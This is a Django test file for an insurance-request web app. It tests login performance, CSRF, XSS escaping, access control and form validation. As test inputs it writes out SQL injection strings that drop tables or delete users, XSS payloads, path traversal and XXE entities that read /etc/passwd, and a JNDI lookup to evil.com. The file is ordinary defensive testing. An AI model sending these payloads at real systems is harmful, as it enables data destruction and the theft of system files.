"""
Performance and security testing for authentication system and form validation
Tests authentication performance under load, validates security measures and access controls,
and tests form validation and data integrity
"""
from django.test import TestCase, Client, TransactionTestCase
from django.contrib.auth.models import User, Group
from django.urls import reverse
from django.core.management import call_command
from django.test.utils import override_settings
from django.contrib.sessions.models import Session
from django.db import transaction
from datetime import datetime, date, timedelta
from unittest.mock import patch, MagicMock
import time
import threading
import concurrent.futures
from django.test import RequestFactory
from django.contrib.auth import authenticate

from .models import InsuranceRequest
from .forms import InsuranceRequestForm
from .middleware import AuthenticationMiddleware
from .decorators import admin_required, user_required


class AuthenticationPerformanceTests(TransactionTestCase):
    """Tests for authentication performance under load"""
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        
        # Set up users and groups
        call_command('setup_user_groups')
        self.admin_user = User.objects.get(username='admin')
        self.regular_user = User.objects.get(username='user')
        
        # Create additional test users for load testing
        self.test_users = []
        for i in range(20):
            user = User.objects.create_user(
                username=f'loadtest_user_{i}',
                password='testpass123'
            )
            user_group = Group.objects.get(name='Пользователи')
            user.groups.add(user_group)
            self.test_users.append(user)
    
    def test_single_login_performance(self):
        """Test single login performance"""
        start_time = time.time()
        
        response = self.client.post(reverse('login'), {
            'username': 'admin',
            'password': 'admin123'
        })
        
        end_time = time.time()
        
        # Login should complete within 0.5 seconds
        login_time = end_time - start_time
        self.assertLess(login_time, 0.5)
        self.assertEqual(response.status_code, 302)
    
    def test_concurrent_login_performance(self):
        """Test concurrent login performance"""
        def login_user(username, password):
            client = Client()
            start_time = time.time()
            response = client.post(reverse('login'), {
                'username': username,
                'password': password
            })
            end_time = time.time()
            return {
                'response_code': response.status_code,
                'login_time': end_time - start_time,
                'username': username
            }
        
        # Test concurrent logins
        with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
            futures = []
            
            # Submit login tasks for multiple users
            for i in range(10):
                username = f'loadtest_user_{i}'
                futures.append(
                    executor.submit(login_user, username, 'testpass123')
                )
            
            # Collect results
            results = []
            for future in concurrent.futures.as_completed(futures):
                results.append(future.result())
        
        # Verify all logins succeeded
        for result in results:
            self.assertEqual(result['response_code'], 302)
            # Each login should complete within 2 seconds under load
            self.assertLess(result['login_time'], 2.0)
        
        # Verify we got results for all users
        self.assertEqual(len(results), 10)
    
    def test_authentication_middleware_performance(self):
        """Test authentication middleware performance"""
        factory = RequestFactory()
        middleware = AuthenticationMiddleware(lambda request: MagicMock(status_code=200))
        
        # Create authenticated request
        request = factory.get('/test-url/')
        request.user = self.admin_user
        
        # Test middleware performance
        start_time = time.time()
        
        for _ in range(1000):
            response = middleware(request)
        
        end_time = time.time()
        
        # 1000 middleware calls should complete within 1 second
        total_time = end_time - start_time
        self.assertLess(total_time, 1.0)
    
    def test_session_creation_performance(self):
        """Test session creation performance"""
        start_time = time.time()
        
        # Create multiple sessions
        clients = []
        for i in range(50):
            client = Client()
            response = client.post(reverse('login'), {
                'username': f'loadtest_user_{i % 20}',
                'password': 'testpass123'
            })
            clients.append(client)
        
        end_time = time.time()
        
        # Creating 50 sessions should complete within 5 seconds
        total_time = end_time - start_time
        self.assertLess(total_time, 5.0)
        
        # Verify sessions were created
        session_count = Session.objects.count()
        self.assertGreaterEqual(session_count, 50)
    
    def test_permission_check_performance(self):
        """Test permission checking performance"""
        from .decorators import has_admin_access, has_user_access
        
        start_time = time.time()
        
        # Test permission checks for multiple users
        for _ in range(1000):
            has_admin_access(self.admin_user)
            has_user_access(self.regular_user)
            has_admin_access(self.regular_user)
            has_user_access(self.admin_user)
        
        end_time = time.time()
        
        # 4000 permission checks should complete within 1 second
        total_time = end_time - start_time
        self.assertLess(total_time, 1.0)
    
    def test_database_query_performance_during_auth(self):
        """Test database query performance during authentication"""
        from django.test.utils import override_settings
        from django.db import connection
        
        with override_settings(DEBUG=True):
            # Reset query count
            connection.queries_log.clear()
            
            # Perform login
            response = self.client.post(reverse('login'), {
                'username': 'admin',
                'password': 'admin123'
            })
            
            # Check number of queries
            query_count = len(connection.queries)
            
            # Login should not require excessive database queries (< 10)
            self.assertLess(query_count, 10)
            self.assertEqual(response.status_code, 302)
    
    def test_memory_usage_during_concurrent_auth(self):
        """Test memory usage during concurrent authentication"""
        import psutil
        import os
        
        process = psutil.Process(os.getpid())
        initial_memory = process.memory_info().rss
        
        # Perform concurrent authentication
        def authenticate_user():
            client = Client()
            client.post(reverse('login'), {
                'username': 'admin',
                'password': 'admin123'
            })
            client.get(reverse('insurance_requests:request_list'))
        
        threads = []
        for _ in range(20):
            thread = threading.Thread(target=authenticate_user)
            threads.append(thread)
            thread.start()
        
        for thread in threads:
            thread.join()
        
        final_memory = process.memory_info().rss
        memory_increase = final_memory - initial_memory
        
        # Memory increase should be reasonable (< 50MB)
        self.assertLess(memory_increase, 50 * 1024 * 1024)


class SecurityMeasuresValidationTests(TestCase):
    """Tests for validating security measures and access controls"""
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        self.factory = RequestFactory()
        
        # Set up users and groups
        call_command('setup_user_groups')
        self.admin_user = User.objects.get(username='admin')
        self.regular_user = User.objects.get(username='user')
        
        # Create test request
        self.test_request = InsuranceRequest.objects.create(
            client_name='Security Test Client',
            inn='1234567890',
            insurance_type='КАСКО',
            created_by=self.admin_user
        )
    
    def test_csrf_protection_on_login_form(self):
        """Test CSRF protection on login form"""
        # Get login page
        response = self.client.get(reverse('login'))
        self.assertEqual(response.status_code, 200)
        
        # Try to submit without CSRF token
        response = self.client.post(reverse('login'), {
            'username': 'admin',
            'password': 'admin123'
        }, HTTP_X_CSRFTOKEN='invalid_token')
        
        # Should be rejected due to CSRF protection
        self.assertEqual(response.status_code, 403)
    
    def test_password_hashing_security(self):
        """Test that passwords are properly hashed"""
        # Create new user
        user = User.objects.create_user(
            username='security_test',
            password='plaintext_password'
        )
        
        # Password should be hashed, not stored in plaintext
        self.assertNotEqual(user.password, 'plaintext_password')
        self.assertTrue(user.password.startswith('pbkdf2_sha256$'))
        
        # Should be able to authenticate with correct password
        authenticated_user = authenticate(
            username='security_test',
            password='plaintext_password'
        )
        self.assertIsNotNone(authenticated_user)
        
        # Should not authenticate with wrong password
        wrong_auth = authenticate(
            username='security_test',
            password='wrong_password'
        )
        self.assertIsNone(wrong_auth)
    
    def test_session_security_settings(self):
        """Test session security settings"""
        # Login to create session
        self.client.login(username='admin', password='admin123')
        
        # Check session cookie settings
        response = self.client.get(reverse('insurance_requests:request_list'))
        
        # Session should be created
        self.assertTrue(response.client.session.session_key)
        
        # Test session expiry (should have reasonable timeout)
        session = Session.objects.get(session_key=response.client.session.session_key)
        self.assertIsNotNone(session.expire_date)
        
        # Session should expire in the future but not too far
        now = datetime.now()
        time_diff = session.expire_date.replace(tzinfo=None) - now
        self.assertGreater(time_diff.total_seconds(), 0)  # Future
        self.assertLess(time_diff.total_seconds(), 30 * 24 * 3600)  # Less than 30 days
    
    def test_sql_injection_protection_in_forms(self):
        """Test SQL injection protection in forms"""
        # Try SQL injection in form fields
        malicious_data = {
            'client_name': "'; DROP TABLE insurance_requests_insurancerequest; --",
            'inn': "1234567890' OR '1'='1",
            'insurance_type': 'КАСКО',
            'vehicle_info': "<script>alert('xss')</script>",
            'dfa_number': "DFA'; DELETE FROM auth_user; --",
            'branch': 'Test Branch',
            'has_franchise': False,
            'has_installment': False,
            'has_autostart': False,
        }
        
        form = InsuranceRequestForm(data=malicious_data)
        
        # Form should handle malicious input safely
        if form.is_valid():
            instance = form.save(commit=False)
            instance.created_by = self.admin_user
            instance.save()
            
            # Data should be escaped/sanitized
            self.assertEqual(instance.client_name, malicious_data['client_name'])
            self.assertEqual(instance.inn, malicious_data['inn'])
            
            # Database should still exist (no SQL injection)
            self.assertTrue(InsuranceRequest.objects.filter(pk=instance.pk).exists())
    
    def test_xss_protection_in_templates(self):
        """Test XSS protection in templates"""
        # Create request with potentially malicious content
        xss_request = InsuranceRequest.objects.create(
            client_name='<script>alert("XSS")</script>',
            inn='1234567890',
            insurance_type='КАСКО',
            vehicle_info='<img src="x" onerror="alert(\'XSS\')">',
            created_by=self.admin_user
        )
        
        self.client.login(username='admin', password='admin123')
        
        # View request detail
        response = self.client.get(
            reverse('insurance_requests:request_detail', kwargs={'pk': xss_request.pk})
        )
        
        self.assertEqual(response.status_code, 200)
        
        # Script tags should be escaped in output
        content = response.content.decode()
        self.assertNotIn('<script>alert("XSS")</script>', content)
        self.assertNotIn('<img src="x" onerror="alert(\'XSS\')">', content)
        
        # But escaped versions should be present
        self.assertIn('&lt;script&gt;', content)
        self.assertIn('&lt;img', content)
    
    def test_unauthorized_access_prevention(self):
        """Test prevention of unauthorized access"""
        # Test access without authentication
        protected_urls = [
            reverse('insurance_requests:request_list'),
            reverse('insurance_requests:upload_excel'),
            reverse('insurance_requests:request_detail', kwargs={'pk': self.test_request.pk}),
            reverse('insurance_requests:edit_request', kwargs={'pk': self.test_request.pk}),
        ]
        
        for url in protected_urls:
            with self.subTest(url=url):
                response = self.client.get(url)
                # Should redirect to login
                self.assertEqual(response.status_code, 302)
                self.assertIn('/login/', response.url)
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation"""
        # Create user without any groups
        no_privilege_user = User.objects.create_user(
            username='no_privilege',
            password='testpass123'
        )
        
        self.client.login(username='no_privilege', password='testpass123')
        
        # Should not be able to access protected resources
        response = self.client.get(reverse('insurance_requests:request_list'))
        self.assertEqual(response.status_code, 403)
        
        # Should not be able to access admin functions
        response = self.client.get('/admin/')
        self.assertIn(response.status_code, [302, 403])  # Redirect to login or access denied
    
    def test_brute_force_protection_simulation(self):
        """Test simulation of brute force protection"""
        # Simulate multiple failed login attempts
        failed_attempts = 0
        
        for i in range(10):
            response = self.client.post(reverse('login'), {
                'username': 'admin',
                'password': 'wrong_password'
            })
            
            if response.status_code == 200:  # Login form redisplayed
                failed_attempts += 1
        
        # All attempts should fail
        self.assertEqual(failed_attempts, 10)
        
        # System should still allow correct login after failed attempts
        response = self.client.post(reverse('login'), {
            'username': 'admin',
            'password': 'admin123'
        })
        self.assertEqual(response.status_code, 302)  # Successful login
    
    def test_sensitive_data_exposure_prevention(self):
        """Test prevention of sensitive data exposure"""
        self.client.login(username='admin', password='admin123')
        
        # Check that sensitive information is not exposed in responses
        response = self.client.get(reverse('insurance_requests:request_list'))
        content = response.content.decode()
        
        # Should not contain sensitive system information
        sensitive_patterns = [
            'SECRET_KEY',
            'DATABASE_PASSWORD',
            'pbkdf2_sha256$',  # Password hashes
            'csrfmiddlewaretoken',  # CSRF tokens should be in forms only
        ]
        
        for pattern in sensitive_patterns:
            if pattern == 'csrfmiddlewaretoken':
                # CSRF tokens should only appear in forms, not in general content
                csrf_count = content.count(pattern)
                self.assertLessEqual(csrf_count, 5)  # Reasonable number for forms
            else:
                self.assertNotIn(pattern, content)
    
    def test_input_validation_security(self):
        """Test input validation for security"""
        # Test various malicious inputs
        malicious_inputs = [
            {'inn': '../../../etc/passwd'},  # Path traversal
            {'inn': '${jndi:ldap://evil.com/a}'},  # JNDI injection
            {'client_name': 'A' * 10000},  # Buffer overflow attempt
            {'dfa_number': '\x00\x01\x02'},  # Null bytes
            {'branch': '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>'},  # XXE
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input):
                form_data = {
                    'client_name': 'Test Client',
                    'inn': '1234567890',
                    'insurance_type': 'КАСКО',
                    'vehicle_info': 'Test vehicle',
                    'dfa_number': 'DFA123',
                    'branch': 'Test Branch',
                    'has_franchise': False,
                    'has_installment': False,
                    'has_autostart': False,
                }
                form_data.update(malicious_input)
                
                form = InsuranceRequestForm(data=form_data)
                
                # Form should either reject invalid input or sanitize it
                if form.is_valid():
                    # If accepted, should be properly sanitized
                    cleaned_data = form.cleaned_data
                    for key, value in malicious_input.items():
                        if key in cleaned_data:
                            # Should not contain dangerous patterns
                            self.assertNotIn('../', str(cleaned_data[key]))
                            self.assertNotIn('${jndi:', str(cleaned_data[key]))
                            self.assertNotIn('\x00', str(cleaned_data[key]))


class FormValidationAndDataIntegrityTests(TestCase):
    """Tests for form validation and data integrity"""
    
    def setUp(self):
        """Set up test data"""
        self.user = User.objects.create_user(
            username='testuser',
            password='testpass123'
        )
        
        self.valid_data = {
            'client_name': 'Test Client',
            'inn': '1234567890',
            'insurance_type': 'КАСКО',
            'insurance_period': '1 год',
            'vehicle_info': 'Test vehicle',
            'dfa_number': 'DFA123',
            'branch': 'Test Branch',
            'has_franchise': False,
            'has_installment': False,
            'has_autostart': False,
        }
    
    def test_form_validation_integrity(self):
        """Test form validation integrity"""
        # Test valid data
        form = InsuranceRequestForm(data=self.valid_data)
        self.assertTrue(form.is_valid())
        
        # Test invalid data combinations
        invalid_cases = [
            # Invalid INN
            {'inn': 'invalid_inn'},
            # Invalid insurance period
            {'insurance_period': 'invalid period'},
            # Missing required fields
            {'client_name': ''},
            # Field length violations
            {'client_name': 'A' * 256},
            {'dfa_number': 'A' * 101},
            {'branch': 'A' * 256},
        ]
        
        for invalid_case in invalid_cases:
            with self.subTest(case=invalid_case):
                test_data = self.valid_data.copy()
                test_data.update(invalid_case)
                
                form = InsuranceRequestForm(data=test_data)
                self.assertFalse(form.is_valid())
    
    def test_data_integrity_during_save(self):
        """Test data integrity during save operations"""
        form = InsuranceRequestForm(data=self.valid_data)
        self.assertTrue(form.is_valid())
        
        # Save instance
        instance = form.save(commit=False)
        instance.created_by = self.user
        instance.save()
        
        # Verify data integrity
        saved_instance = InsuranceRequest.objects.get(pk=instance.pk)
        
        self.assertEqual(saved_instance.client_name, self.valid_data['client_name'])
        self.assertEqual(saved_instance.inn, self.valid_data['inn'])
        self.assertEqual(saved_instance.insurance_type, self.valid_data['insurance_type'])
        self.assertEqual(saved_instance.insurance_period, self.valid_data['insurance_period'])
    
    def test_concurrent_data_modification_integrity(self):
        """Test data integrity during concurrent modifications"""
        # Create initial request
        request = InsuranceRequest.objects.create(
            client_name='Concurrent Test',
            inn='1234567890',
            insurance_type='КАСКО',
            created_by=self.user
        )
        
        def modify_request(new_name):
            try:
                with transaction.atomic():
                    req = InsuranceRequest.objects.get(pk=request.pk)
                    req.client_name = new_name
                    req.save()
                    return True
            except Exception:
                return False
        
        # Simulate concurrent modifications
        with concurrent.futures.ThreadPoolExecutor(max_workers=5) as executor:
            futures = []
            for i in range(10):
                futures.append(
                    executor.submit(modify_request, f'Modified Name {i}')
                )
            
            results = [future.result() for future in concurrent.futures.as_completed(futures)]
        
        # At least some modifications should succeed
        successful_modifications = sum(results)
        self.assertGreater(successful_modifications, 0)
        
        # Final state should be consistent
        final_request = InsuranceRequest.objects.get(pk=request.pk)
        self.assertTrue(final_request.client_name.startswith('Modified Name'))
    
    def test_form_validation_performance(self):
        """Test form validation performance"""
        # Create large dataset for validation
        test_cases = []
        for i in range(100):
            test_data = self.valid_data.copy()
            test_data['client_name'] = f'Performance Test Client {i}'
            test_data['inn'] = f'{1000000000 + i}'
            test_cases.append(test_data)
        
        start_time = time.time()
        
        # Validate all forms
        valid_forms = 0
        for test_data in test_cases:
            form = InsuranceRequestForm(data=test_data)
            if form.is_valid():
                valid_forms += 1
        
        end_time = time.time()
        
        # Should validate 100 forms within 2 seconds
        validation_time = end_time - start_time
        self.assertLess(validation_time, 2.0)
        self.assertEqual(valid_forms, 100)
    
    def test_database_constraint_integrity(self):
        """Test database constraint integrity"""
        # Test unique constraints (if any)
        request1 = InsuranceRequest.objects.create(
            client_name='Constraint Test 1',
            inn='1111111111',
            insurance_type='КАСКО',
            dfa_number='UNIQUE-DFA-001',
            created_by=self.user
        )
        
        # Should be able to create another request with different DFA number
        request2 = InsuranceRequest.objects.create(
            client_name='Constraint Test 2',
            inn='2222222222',
            insurance_type='КАСКО',
            dfa_number='UNIQUE-DFA-002',
            created_by=self.user
        )
        
        self.assertNotEqual(request1.pk, request2.pk)
        self.assertNotEqual(request1.dfa_number, request2.dfa_number)
    
    def test_field_type_validation_integrity(self):
        """Test field type validation integrity"""
        # Test insurance period field validation
        invalid_period_cases = [
            {'insurance_period': 'invalid period choice'},
            {'insurance_period': 'с неправильной датой'},
        ]
        
        for invalid_case in invalid_period_cases:
            with self.subTest(case=invalid_case):
                test_data = self.valid_data.copy()
                test_data.update(invalid_case)
                
                form = InsuranceRequestForm(data=test_data)
                self.assertFalse(form.is_valid())
        
        # Test boolean field validation
        boolean_cases = [
            {'has_franchise': 'true'},  # String instead of boolean
            {'has_installment': 'yes'},
            {'has_autostart': '1'},
        ]
        
        for boolean_case in boolean_cases:
            with self.subTest(case=boolean_case):
                test_data = self.valid_data.copy()
                test_data.update(boolean_case)
                
                form = InsuranceRequestForm(data=test_data)
                # Form should handle string to boolean conversion
                if form.is_valid():
                    # Should convert to proper boolean
                    self.assertIsInstance(form.cleaned_data[list(boolean_case.keys())[0]], bool)
    
    def test_data_sanitization_integrity(self):
        """Test data sanitization integrity"""
        # Test data with various whitespace and formatting issues
        messy_data = {
            'client_name': '  Test Client  \n\t',
            'inn': ' 1234567890 ',
            'insurance_type': 'КАСКО',
            'vehicle_info': '\n\nTest vehicle\n\n',
            'dfa_number': '  DFA123  ',
            'branch': '\tTest Branch\t',
            'has_franchise': False,
            'has_installment': False,
            'has_autostart': False,
        }
        
        form = InsuranceRequestForm(data=messy_data)
        self.assertTrue(form.is_valid())
        
        # Check that data is properly cleaned
        cleaned_data = form.cleaned_data
        self.assertEqual(cleaned_data['client_name'], 'Test Client')
        self.assertEqual(cleaned_data['inn'], '1234567890')
        self.assertEqual(cleaned_data['vehicle_info'], 'Test vehicle')
        self.assertEqual(cleaned_data['dfa_number'], 'DFA123')
        self.assertEqual(cleaned_data['branch'], 'Test Branch')
    
    def test_form_error_handling_integrity(self):
        """Test form error handling integrity"""
        # Create form with multiple errors
        invalid_data = {
            'client_name': '',  # Required field empty
            'inn': 'invalid',  # Invalid format
            'insurance_type': 'invalid_type',  # Invalid choice
            'insurance_period': 'invalid period choice',  # Invalid period
            'dfa_number': 'A' * 101,  # Too long
            'branch': 'A' * 256,  # Too long
            'has_franchise': False,
            'has_installment': False,
            'has_autostart': False,
        }
        
        form = InsuranceRequestForm(data=invalid_data)
        self.assertFalse(form.is_valid())
        
        # Should have errors for multiple fields
        self.assertIn('client_name', form.errors)
        self.assertIn('inn', form.errors)
        self.assertIn('insurance_type', form.errors)
        self.assertIn('insurance_period', form.errors)
        self.assertIn('dfa_number', form.errors)
        self.assertIn('branch', form.errors)
        
        # Error messages should be informative
        for field_errors in form.errors.values():
            for error in field_errors:
                self.assertIsInstance(error, str)
                self.assertGreater(len(error), 0)


class SecurityIntegrationTests(TestCase):
    """Integration tests for complete security workflow"""
    
    def setUp(self):
        """Set up test data"""
        self.client = Client()
        call_command('setup_user_groups')
        self.admin_user = User.objects.get(username='admin')
        self.regular_user = User.objects.get(username='user')
    
    def test_complete_security_workflow(self):
        """Test complete security workflow from login to data access"""
        # Step 1: Attempt unauthorized access
        response = self.client.get(reverse('insurance_requests:request_list'))
        self.assertEqual(response.status_code, 302)  # Redirect to login
        
        # Step 2: Login with valid credentials
        response = self.client.post(reverse('login'), {
            'username': 'admin',
            'password': 'admin123'
        })
        self.assertEqual(response.status_code, 302)  # Successful login
        
        # Step 3: Access protected resource
        response = self.client.get(reverse('insurance_requests:request_list'))
        self.assertEqual(response.status_code, 200)  # Authorized access
        
        # Step 4: Create data with potential security issues
        secure_data = {
            'client_name': 'Security Test <script>alert("xss")</script>',
            'inn': '1234567890',
            'insurance_type': 'КАСКО',
            'vehicle_info': 'Test vehicle',
            'dfa_number': 'SEC-001',
            'branch': 'Security Branch',
            'has_franchise': False,
            'has_installment': False,
            'has_autostart': False,
        }
        
        request = InsuranceRequest.objects.create(
            **secure_data,
            created_by=self.admin_user
        )
        
        # Step 5: Verify data is safely displayed
        response = self.client.get(
            reverse('insurance_requests:request_detail', kwargs={'pk': request.pk})
        )
        self.assertEqual(response.status_code, 200)
        
        # XSS should be prevented
        content = response.content.decode()
        self.assertNotIn('<script>alert("xss")</script>', content)
        self.assertIn('&lt;script&gt;', content)
        
        # Step 6: Logout
        response = self.client.post(reverse('logout'))
        self.assertEqual(response.status_code, 302)
        
        # Step 7: Verify access is revoked
        response = self.client.get(reverse('insurance_requests:request_list'))
        self.assertEqual(response.status_code, 302)  # Redirect to login
    
    def test_role_based_security_enforcement(self):
        """Test role-based security enforcement"""
        # Create test data
        admin_request = InsuranceRequest.objects.create(
            client_name='Admin Request',
            inn='1111111111',
            insurance_type='КАСКО',
            created_by=self.admin_user
        )
        
        user_request = InsuranceRequest.objects.create(
            client_name='User Request',
            inn='2222222222',
            insurance_type='другое',
            created_by=self.regular_user
        )
        
        # Test admin access
        self.client.login(username='admin', password='admin123')
        
        # Admin should access both requests
        response = self.client.get(
            reverse('insurance_requests:request_detail', kwargs={'pk': admin_request.pk})
        )
        self.assertEqual(response.status_code, 200)
        
        response = self.client.get(
            reverse('insurance_requests:request_detail', kwargs={'pk': user_request.pk})
        )
        self.assertEqual(response.status_code, 200)
        
        # Test regular user access
        self.client.login(username='user', password='user123')
        
        # Regular user should access both requests (based on current permissions)
        response = self.client.get(
            reverse('insurance_requests:request_detail', kwargs={'pk': admin_request.pk})
        )
        self.assertEqual(response.status_code, 200)
        
        response = self.client.get(
            reverse('insurance_requests:request_detail', kwargs={'pk': user_request.pk})
        )
        self.assertEqual(response.status_code, 200)
    
    def test_session_security_lifecycle(self):
        """Test session security throughout lifecycle"""
        # Login
        response = self.client.post(reverse('login'), {
            'username': 'admin',
            'password': 'admin123'
        })
        self.assertEqual(response.status_code, 302)
        
        # Get session key
        session_key = self.client.session.session_key
        self.assertIsNotNone(session_key)
        
        # Verify session exists in database
        session_exists = Session.objects.filter(session_key=session_key).exists()
        self.assertTrue(session_exists)
        
        # Access protected resource
        response = self.client.get(reverse('insurance_requests:request_list'))
        self.assertEqual(response.status_code, 200)
        
        # Logout
        response = self.client.post(reverse('logout'))
        self.assertEqual(response.status_code, 302)
        
        # Verify session is invalidated
        response = self.client.get(reverse('insurance_requests:request_list'))
        self.assertEqual(response.status_code, 302)  # Should redirect to login